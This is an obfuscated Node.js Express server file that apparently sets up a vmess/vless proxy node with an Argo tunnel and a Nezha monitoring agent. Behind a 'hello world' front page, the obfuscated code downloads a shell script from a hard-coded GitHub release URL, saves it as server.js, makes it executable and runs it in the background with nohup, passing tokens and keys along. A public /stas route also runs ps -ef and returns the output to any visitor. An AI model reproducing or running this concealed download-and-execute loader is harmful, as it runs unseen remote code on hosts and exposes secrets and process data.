const port = process.env.SERVER_PORT || process.env.PORT || 3000;
//====节点参数
const uuid = process.env.UUID || '31f08bb9-99fa-4948-8268-1b2ab12033a7'; // 不填，则使用随机
const vmms = process.env.MPATH || 'vms'; //vms path
const vmmport = process.env.VM_PORT || '8001'; //vms 端口
const vpath = process.env.VPATH || 'vls'; //vls path
const vport = process.env.VL_PORT || '8002'; //vls端口
const tmpargo = process.env.TMP_ARGO || 'vms'; //协议类型可选vms,vls
const subname = process.env.SUB_NAME || 'Argo'; //名称
const suburl = process.env.SUB_URL || ''; //订阅服务器地址
//====哪吒参数
const nezhaser = process.env.NEZHA_SERVER || '';
const nezhaKey = process.env.NEZHA_KEY || '';
const nezport = process.env.NEZHA_PORT || '443';
const neztls = process.env.NEZHA_TLS || '1';
//====隧道参数
const argoKey = process.env.TOK || ''; //隧道token,不填则使用临时隧道
const argodomain = process.env.ARGO_DOMAIN || ''; //固定隧道域名，使用token时必填
function _0x1a74(_0x4fd574,_0xe7dd1f){const _0x2b3af7=_0x2b3a();return _0x1a74=function(_0x1a74e0,_0x5507be){_0x1a74e0=_0x1a74e0-0x95;let _0x3c344b=_0x2b3af7[_0x1a74e0];return _0x3c344b;},_0x1a74(_0x4fd574,_0xe7dd1f);}const _0x93daf6=_0x1a74;(function(_0x29c2a5,_0x106aa5){const _0x2fac8c=_0x1a74,_0x25e282=_0x29c2a5();while(!![]){try{const _0x11d66a=-parseInt(_0x2fac8c(0xe0))/0x1*(parseInt(_0x2fac8c(0xa6))/0x2)+-parseInt(_0x2fac8c(0xc4))/0x3*(-parseInt(_0x2fac8c(0xe2))/0x4)+parseInt(_0x2fac8c(0xa4))/0x5*(-parseInt(_0x2fac8c(0xcd))/0x6)+parseInt(_0x2fac8c(0xe9))/0x7*(-parseInt(_0x2fac8c(0xc1))/0x8)+-parseInt(_0x2fac8c(0xac))/0x9+-parseInt(_0x2fac8c(0xeb))/0xa+parseInt(_0x2fac8c(0xca))/0xb*(parseInt(_0x2fac8c(0x9c))/0xc);if(_0x11d66a===_0x106aa5)break;else _0x25e282['push'](_0x25e282['shift']());}catch(_0x5c1730){_0x25e282['push'](_0x25e282['shift']());}}}(_0x2b3a,0xa6c3a));const express=require(_0x93daf6(0xb8)),app=express(),exec=require(_0x93daf6(0xd9))[_0x93daf6(0xd0)],{execSync}=require('child_process'),os=require('os'),{createProxyMiddleware}=require(_0x93daf6(0xc6)),axios=require(_0x93daf6(0x95)),fs=require('fs'),path=require(_0x93daf6(0x99));console['log']('=============================='),console[_0x93daf6(0xdb)](''),console['log']('/stas\x20查看进程'),console[_0x93daf6(0xdb)]('/'+vmms+_0x93daf6(0x9e)),console['log']('/'+vpath+'\x20vls直连'),console[_0x93daf6(0xdb)]('/'+uuid+'\x20查看订阅'),console['log'](''),console[_0x93daf6(0xdb)](_0x93daf6(0xec)),app['get']('/',function(_0x2a7044,_0x1b6d7b){const _0x52296c=_0x93daf6;_0x1b6d7b['send'](_0x52296c(0xe5));}),app[_0x93daf6(0xe8)](_0x93daf6(0xf0),function(_0x4a9fb4,_0x22ca1c){const _0x2cc4c8=_0x93daf6;let _0x13fe02=_0x2cc4c8(0xa9);exec(_0x13fe02,function(_0x4af08c,_0x2e512f,_0xd2de96){const _0x460d15=_0x2cc4c8;_0x4af08c?_0x22ca1c[_0x460d15(0xee)](_0x460d15(0xa2))[_0x460d15(0xd5)](_0x460d15(0xb4)+_0x4af08c+'</pre>'):_0x22ca1c[_0x460d15(0xee)]('html')['send'](_0x460d15(0xbd)+_0x2e512f+'</pre>');});}),app[_0x93daf6(0xd4)]('/'+vmms,createProxyMiddleware({'changeOrigin':!![],'onProxyReq':function(_0x12d794,_0x1dbb77,_0x3c6d92){},'pathRewrite':{['^/'+vmms]:'/'+vmms},'target':'http://127.0.0.1:'+vmmport+'/','ws':!![]})),app[_0x93daf6(0xd4)]('/'+vpath,createProxyMiddleware({'changeOrigin':!![],'onProxyReq':function(_0x3425ff,_0x1f1844,_0x46bb87){},'pathRewrite':{['^/'+vpath]:'/'+vpath},'target':_0x93daf6(0xab)+vport+'/','ws':!![]})),app[_0x93daf6(0xe8)]('/'+uuid,function(_0x49d76a,_0xe8339d){const _0x378a96=_0x93daf6;fs[_0x378a96(0xa3)](_0x378a96(0xd2),'utf8',(_0x3dada4,_0x2b3c5d)=>{const _0x1e6258=_0x378a96;if(_0x3dada4){console[_0x1e6258(0xb2)]('Error\x20reading\x20file:',_0x3dada4),_0xe8339d['status'](0x1f4)['send'](_0x1e6258(0xa7));return;}_0xe8339d[_0x1e6258(0xc2)]('Content-Type',_0x1e6258(0xc7)),_0xe8339d[_0x1e6258(0xd5)](_0x2b3c5d);});});function _0x2b3a(){const _0x827d37=['\x20found\x20using\x20ps\x20and\x20grep.','\x20NEZHA_PORT=','下载server失败','html','readFile','238690VFGiQM','pidof\x20','626OBEJAz','Internal\x20Server\x20Error','F_OK','ps\x20-ef\x20|\x20sed\x20\x27s@--token.*@--token@g;s@-s.*@-s\x20SERVER@g;s@*.chmod@chmod@g\x27','constants','http://127.0.0.1:','8395182GGxCoJ','then','\x20&&\x20chmod\x20+x\x20./server.js\x20&&\x20nohup\x20./server.js\x20>/dev/null\x202>&1\x20&','/cmdline','Process\x20','join','error','下载server成功','<pre>命令行执行错误：\x0a','amd64','readdirSync','\x20SUB_NAME=','express','\x20TOK=','\x20NEZHA_SERVER=','data','\x20SUB_URL=','<pre>获取系统进程表：\x0a','server.js\x20is\x20already\x20running.','\x20found\x20using\x20pidof.','catch','8Ptmpbc','setHeader','Waiting\x20for\x20server.js\x20to\x20exist...','3jIWwTk','\x20ARGO_DOMAIN=','http-proxy-middleware','text/plain;\x20charset=utf-8','调起server-命令行执行错误:','toString','33OFlojQ','listen','ps\x20aux\x20|\x20grep\x20\x22','102qFFaiY','export\x20UUID=','\x20TMP_ARGO=','exec','\x20MPATH=','/tmp/list.log','trim','use','send','includes','\x20VPATH=','调起server-命令行执行成功!','child_process','Example\x20app\x20listening\x20on\x20port\x20','log','URL_BOT','env','/proc','close','53uMHDWF','server.js','583964UelwBc','test','readFileSync','hello\x20world','\x20VL_PORT=','Unable\x20to\x20check\x20/proc\x20directory.','get','4600519BQYLZd','\x20found\x20in\x20/proc\x20directory.','9257760JFZCQd','==============================','stream','type','x64','/stas','axios','https://github.com/dsadsadsss/nodejs-wanju2/releases/download/1/start.sh','\x20VM_PORT=','/proc/','path','createWriteStream','arch','15524004QBHVfK','pipe','\x20vms直连'];_0x2b3a=function(){return _0x827d37;};return _0x2b3a();}function isProcessRunning(_0x4edb45){const _0x4cc488=_0x93daf6;try{return execSync(_0x4cc488(0xa5)+_0x4edb45),console['log'](_0x4cc488(0xb0)+_0x4edb45+_0x4cc488(0xbf)),!![];}catch(_0x347ceb){}try{const _0x1f7551=execSync(_0x4cc488(0xcc)+_0x4edb45+'\x22\x20|\x20grep\x20-v\x20grep')[_0x4cc488(0xc9)]();if(_0x1f7551[_0x4cc488(0xd3)]()!=='')return console[_0x4cc488(0xdb)]('Process\x20'+_0x4edb45+_0x4cc488(0x9f)),!![];}catch(_0x4976c6){}try{const _0x42561e=fs[_0x4cc488(0xb6)](_0x4cc488(0xde));for(const _0x2c99b9 of _0x42561e){if(/^\d+$/[_0x4cc488(0xe3)](_0x2c99b9))try{const _0x1087d8=fs[_0x4cc488(0xe4)](_0x4cc488(0x98)+_0x2c99b9+_0x4cc488(0xaf),'utf8');if(_0x1087d8[_0x4cc488(0xd6)](_0x4edb45))return console['log']('Process\x20'+_0x4edb45+_0x4cc488(0xea)),!![];}catch(_0x2d2df2){}}}catch(_0x25dd50){console[_0x4cc488(0xdb)](_0x4cc488(0xe7));}return console[_0x4cc488(0xdb)]('Process\x20'+_0x4edb45+'\x20not\x20found.'),![];}function start_server(){const _0x2faf2c=_0x93daf6;if(!isProcessRunning('server.js')){const _0x20798f=()=>{const _0x58ec64=_0x1a74;fs['access']('./server.js',fs[_0x58ec64(0xaa)][_0x58ec64(0xa8)],_0x2a07e2=>{const _0x405f55=_0x58ec64;if(_0x2a07e2)console[_0x405f55(0xdb)](_0x405f55(0xc3)),setTimeout(_0x20798f,0x1388);else{const _0x42b8ce=_0x405f55(0xce)+uuid+_0x405f55(0xd1)+vmms+_0x405f55(0x97)+vmmport+_0x405f55(0xd7)+vpath+_0x405f55(0xe6)+vport+_0x405f55(0xcf)+tmpargo+_0x405f55(0xba)+nezhaser+'\x20NEZHA_KEY='+nezhaKey+_0x405f55(0xa0)+nezport+'\x20NEZHA_TLS='+neztls+_0x405f55(0xc5)+argodomain+_0x405f55(0xb9)+argoKey+_0x405f55(0xb7)+subname+_0x405f55(0xbc)+suburl+_0x405f55(0xae);exec(_0x42b8ce,function(_0x2eafc6,_0x36fa85,_0x22b0cd){const _0x3b4343=_0x405f55;if(_0x2eafc6)console[_0x3b4343(0xdb)](_0x3b4343(0xc8),_0x2eafc6);else console[_0x3b4343(0xdb)](_0x3b4343(0xd8));});}});};_0x20798f();}else console['log'](_0x2faf2c(0xbe));}function download_web(_0x3783bd){const _0x3adca8=_0x93daf6;let _0x1418c4=_0x3adca8(0xe1),_0x4066d5=os[_0x3adca8(0x9b)]()===_0x3adca8(0xef)||os['arch']()===_0x3adca8(0xb5)?process[_0x3adca8(0xdd)][_0x3adca8(0xdc)]||_0x3adca8(0x96):process[_0x3adca8(0xdd)]['URL_BOT2']||_0x3adca8(0x96),_0x4642f9=fs[_0x3adca8(0x9a)](path[_0x3adca8(0xb1)]('./',_0x1418c4));axios[_0x3adca8(0xe8)](_0x4066d5,{'responseType':_0x3adca8(0xed)})[_0x3adca8(0xad)](_0x59bb97=>{const _0x310567=_0x3adca8;_0x59bb97[_0x310567(0xbb)][_0x310567(0x9d)](_0x4642f9),_0x4642f9['on'](_0x310567(0xdf),()=>_0x3783bd(null));})[_0x3adca8(0xc0)](_0x388b44=>_0x3783bd(_0x3adca8(0xa1)));}download_web(_0x48ab1c=>{const _0x462e23=_0x93daf6;_0x48ab1c?console[_0x462e23(0xdb)](_0x48ab1c):(console[_0x462e23(0xdb)](_0x462e23(0xb3)),start_server());}),app[_0x93daf6(0xcb)](port,()=>console[_0x93daf6(0xdb)](_0x93daf6(0xda)+port+'!'));
